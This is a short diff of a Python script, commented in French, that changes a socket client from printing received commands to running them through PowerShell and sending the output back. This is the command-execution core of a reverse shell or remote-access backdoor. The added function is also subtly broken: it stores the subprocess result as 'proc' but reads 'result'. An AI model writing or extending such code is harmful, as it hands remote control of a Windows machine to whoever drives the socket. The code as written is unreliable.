@@ -40,9 +40,24 @@ def main():
         if commande == "exit":
             break
 
-        print(f"[*] Commande recue: {commande}")
+        # on execute et on renvoie le resultat
+        resultat = execute_cmd(commande)
+        sock.send(resultat.encode())
 
     sock.close()
+
+
+# execute une commande powershell et renvoie la sortie
+def execute_cmd(cmd):
+    proc = subprocess.run(
+        ["powershell.exe", "-Command", cmd],
+        capture_output=True, text=True,
+        encoding="utf-8", errors="replace", timeout=30
+    )
+    output = result.stdout + result.stderr
+    if not output.strip():
+        output = "(pas de sortie)"
+    return output
 
 
 if __name__ == "__main__":
